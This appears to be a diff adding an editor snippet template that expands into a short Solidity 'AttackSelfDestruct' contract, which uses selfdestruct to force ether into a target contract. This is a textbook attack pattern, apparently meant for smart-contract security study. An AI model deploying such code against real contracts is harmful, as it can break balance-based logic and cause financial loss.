@@ -1,0 +1,15 @@
+# -*- mode: snippet -*-
+# name: selfdestruct
+# key: selfdestruct
+# --
+contract AttackSelfDestruct {
+    SelfDestructMe target;
+
+    constructor(SelfDestructMe _target) payable {
+        target = _target;
+    }
+
+    function attack() external payable {
+        selfdestruct(payable(address(target)));
+    }
+}
